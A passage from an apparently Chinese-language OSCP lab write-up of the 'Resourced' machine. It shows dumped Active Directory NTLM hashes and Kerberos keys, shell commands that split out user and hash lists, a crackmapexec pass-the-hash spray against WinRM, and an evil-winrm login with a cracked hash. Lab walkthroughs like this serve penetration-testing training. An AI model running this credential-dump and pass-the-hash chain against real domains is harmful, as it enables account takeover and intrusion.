P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ cat credentials.txt.ntds
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```

把 ntlm hash 提取出來

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ cat credentials.txt.ntds | cut -d: -f4
12579b1666d4ac10f0f59f300776495f
31d6cfe0d16ae931b73c59d7e0c089c0
9ddb6f4d9d01fedeb4bccfb09df1b39d
3004b16f88664fbebfcb9ed272b0565b
3105e0f6af52aba8e11d19f27e487e45
204410cc5a7147cd52a04ddae6754b0c
19a3a7550ce8c505c2d46b5e39d6f808
3e028552b946cc4f282b72879f63b726
913c144caea1c0a936fd1ccb46929d3c
bd7c11a9021d2708eda561984f3c8939
980910b8fc2e4fe9d482123301dd19fe
fea5a148c14cf51590456b2102b29fac
08aca8ed17a9eec9fac4acdcb4652c35
62e16d17c3015c47b4d513e65ca757a2

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ cat credentials.txt.ntds | cut -d: -f4 > cred.txt
```

也把 user 提取出來

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ cat credentials.txt.ntds | cut -d: -f1 > user.txt

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ cat user.txt
Administrator
Guest
RESOURCEDC$
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

使用 hashcat 爆破沒成功，改用 crackmapexec 針對一開始 nmap 掃到的 winrm 爆破

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ crackmapexec winrm 192.168.154.175 -d resourced.local -u user.txt -H cred.txt
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
HTTP        192.168.154.175 5985   192.168.154.175  [*] http://192.168.154.175:5985/wsman
WINRM       192.168.154.175 5985   192.168.154.175  [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.154.175 5985   192.168.154.175  [-] resourced.local\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
WINRM       192.168.154.175 5985   192.168.154.175  [-] resourced.local\Administrator:9ddb6f4d9d01fedeb4bccfb09df1b39d
WINRM       192.168.154.175 5985   192.168.154.175  [-] resourced.local\Administrator:3004b16f88664fbebfcb9ed272b0565b

...

WINRM       192.168.154.175 5985   192.168.154.175  [-] resourced.local\L.Livingstone:3105e0f6af52aba8e11d19f27e487e45
WINRM       192.168.154.175 5985   192.168.154.175  [-] resourced.local\L.Livingstone:204410cc5a7147cd52a04ddae6754b0c
WINRM       192.168.154.175 5985   192.168.154.175  [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

得到一組帳密！

```json
L.Livingstone / 19a3a7550ce8c505c2d46b5e39d6f808
```

嘗試用 evil-winrm 登入

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ evil-winrm -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 -i 192.168.154.175

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
```

[Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)

[Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)

[Writeup](https://medium.com/@husamkhan2014/proving-grounds-resourced-dc-writeup-50c25c5a23c5)

[Writeup](https://www.youtube.com/watch?v=xMTCZt5DRB0&ab_channel=vulnlab)

